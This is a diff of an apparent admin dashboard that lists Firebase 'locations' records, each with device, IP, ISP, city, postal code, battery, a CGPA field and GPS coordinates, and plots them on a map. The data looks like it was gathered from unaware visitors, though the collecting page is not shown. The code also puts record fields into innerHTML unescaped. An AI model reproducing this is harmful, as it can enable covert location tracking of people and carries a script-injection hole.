@@ -97,75 +97,83 @@ let modalMap, modalMarker, currentLayer;
 const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{ attribution: '&copy; OpenStreetMap contributors' });
 const satLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=s&x={x}&y={y}&z={z}', { maxZoom:20, subdomains:['mt0','mt1','mt2','mt3'], attribution:'&copy; Google Satellite' });
 
-closeModal.onclick=()=>{ modal.style.display="none"; if(modalMap){modalMap.remove(); modalMap=null;} }
-window.onclick=(e)=>{ if(e.target==modal){ modal.style.display="none"; if(modalMap){modalMap.remove(); modalMap=null;} } }
+closeModal.onclick = () => { modal.style.display="none"; if(modalMap){ modalMap.remove(); modalMap=null; } }
+window.onclick = (e) => { if(e.target==modal){ modal.style.display="none"; if(modalMap){ modalMap.remove(); modalMap=null; } } }
 
-// ✅ Loader fix: show loader BEFORE fetching data
-loader.style.display="block";
+loader.style.display = "block";
 
-onValue(ref(db,"locations"), snapshot=>{
-  const data = snapshot.val();
-  tableBody.innerHTML=""; 
+onValue(ref(db,"locations"), snapshot => {
+  loader.style.display = "block";
+  const data = snapshot.val() || {};
+  tableBody.innerHTML = "";
 
-  const entries = data ? Object.values(data).sort((a,b)=>b.timestamp - a.timestamp) : [];
+  const entries = Object.values(data)
+    .filter(e => e && e.timestamp)
+    .sort((a,b) => b.timestamp - a.timestamp);
+
   if(entries.length === 0){
-    tableBody.innerHTML="<tr><td colspan='4'>No shared details found.</td></tr>"; 
-    loader.style.display="none";  // hide loader
-    return; 
+    tableBody.innerHTML = "<tr><td colspan='4'>No shared details found.</td></tr>";
+  } else {
+    entries.forEach(entry => {
+      const dateObj = new Date(entry.timestamp);
+      const dayStr = dateObj.toLocaleDateString('en-US',{ weekday:'long' });
+      const dateStr = `${dateObj.toLocaleDateString()} (${dayStr}) ${dateObj.toLocaleTimeString()}`;
+      const tr = document.createElement("tr");
+      tr.classList.add(entry.device?.toLowerCase()?.includes("mobile") ? "mobile" : "desktop");
+      if(["Saturday","Sunday"].includes(dayStr)) tr.classList.add("weekend");
+
+      tr.innerHTML = `
+        <td>${dateStr}</td>
+        <td>${entry.device || 'N/A'}</td>
+        <td>${entry.ip || 'N/A'}</td>
+        <td>${entry.city || 'N/A'}</td>
+      `;
+      tr.onclick = () => { openModal(entry); };
+      tableBody.appendChild(tr);
+    });
   }
 
-  entries.forEach(entry=>{
-    const dateObj = new Date(entry.timestamp);
-    const dayStr = dateObj.toLocaleDateString('en-US',{ weekday:'long' });
-    const dateStr = `${dateObj.toLocaleDateString()} (${dayStr}) ${dateObj.toLocaleTimeString()}`;
-    const tr = document.createElement("tr");
-    tr.classList.add(entry.device.toLowerCase().includes("mobile") ? "mobile" : "desktop");
-    if(["Saturday","Sunday"].includes(dayStr)) tr.classList.add("weekend");
-
-    tr.innerHTML = `
-      <td>${dateStr}</td>
-      <td>${entry.device}</td>
-      <td>${entry.ip}</td>
-      <td>${entry.city}</td>
-    `;
-    tr.onclick = () => { openModal(entry); };
-    tableBody.appendChild(tr);
-  });
-
-  loader.style.display="none";  // hide loader after table populated
+  loader.style.display = "none";
+}, error => {
+  console.error(error);
+  tableBody.innerHTML = "<tr><td colspan='4'>Error loading data from Firebase.</td></tr>";
+  loader.style.display = "none";
 });
 
 function openModal(entry){
   modal.style.display="block";
   modalDetails.innerHTML=`
-    <div><b>CGPA:</b> ${entry.cgpa}</div>
-    <div><b>Device:</b> ${entry.device}</div>
+    <div><b>CGPA:</b> ${entry.cgpa || 'N/A'}</div>
+    <div><b>Device:</b> ${entry.device || 'N/A'}</div>
     <div><b>Timezone:</b> ${entry.timezone || 'N/A'}</div>
     <div><b>Battery:</b> ${entry.battery || 'N/A'}</div>
-    <div><b>IP:</b> ${entry.ip}</div>
+    <div><b>IP:</b> ${entry.ip || 'N/A'}</div>
     <div><b>ISP / Org:</b> ${entry.isp || 'N/A'}</div>
-    <div><b>City:</b> ${entry.city}</div>
-    <div><b>Region:</b> ${entry.region} (${entry.region_code || 'N/A'})</div>
-    <div><b>Country:</b> ${entry.country}</div>
+    <div><b>City:</b> ${entry.city || 'N/A'}</div>
+    <div><b>Region:</b> ${entry.region || 'N/A'} (${entry.region_code || 'N/A'})</div>
+    <div><b>Country:</b> ${entry.country || 'N/A'}</div>
     <div><b>Postal:</b> ${entry.postal || 'N/A'}</div>
-    <div><b>IP Coordinates:</b> ${entry.ip_lat}, ${entry.ip_lon}</div>
-    <div><b>GPS Coordinates:</b> ${entry.gps_lat}, ${entry.gps_lon}</div>
+    <div><b>IP Coordinates:</b> ${entry.ip_lat || 'N/A'}, ${entry.ip_lon || 'N/A'}</div>
+    <div><b>GPS Coordinates:</b> ${entry.gps_lat || 'N/A'}, ${entry.gps_lon || 'N/A'}</div>
     <div><b>Saved At:</b> ${new Date(entry.timestamp).toLocaleString()}</div>
   `;
 
   if(modalMap){ modalMap.remove(); modalMap=null; }
-  modalMap=L.map(modalMapDiv).setView([20,0],2);
-  currentLayer=streetLayer.addTo(modalMap);
+  modalMap = L.map(modalMapDiv).setView([20,0],2);
+  currentLayer = streetLayer.addTo(modalMap);
   setTimeout(()=>{
-    modalMap.flyTo([entry.gps_lat, entry.gps_lon],15,{animate:true,duration:3});
-    modalMarker=L.marker([entry.gps_lat, entry.gps_lon]).addTo(modalMap)
-      .bindPopup(`Device: ${entry.device}<br>CGPA: ${entry.cgpa}<br>${entry.city}, ${entry.region}, ${entry.country}<br>ISP: ${entry.isp || 'N/A'}`).openPopup();
+    if(entry.gps_lat && entry.gps_lon){
+      modalMap.flyTo([entry.gps_lat, entry.gps_lon],15,{animate:true,duration:3});
+      modalMarker = L.marker([entry.gps_lat, entry.gps_lon]).addTo(modalMap)
+        .bindPopup(`Device: ${entry.device}<br>CGPA: ${entry.cgpa}<br>${entry.city}, ${entry.region}, ${entry.country}<br>ISP: ${entry.isp || 'N/A'}`).openPopup();
+    }
   },300);
 }
 
-streetBtn.onclick=()=>{ if(modalMap && currentLayer){ modalMap.removeLayer(currentLayer); currentLayer=streetLayer.addTo(modalMap); } };
-satBtn.onclick=()=>{ if(modalMap && currentLayer){ modalMap.removeLayer(currentLayer); currentLayer=satLayer.addTo(modalMap); } };
+streetBtn.onclick = () => { if(modalMap && currentLayer){ modalMap.removeLayer(currentLayer); currentLayer=streetLayer.addTo(modalMap); } };
+satBtn.onclick = () => { if(modalMap && currentLayer){ modalMap.removeLayer(currentLayer); currentLayer=satLayer.addTo(modalMap); } };
 </script>
 </body>
 </html>
+
 
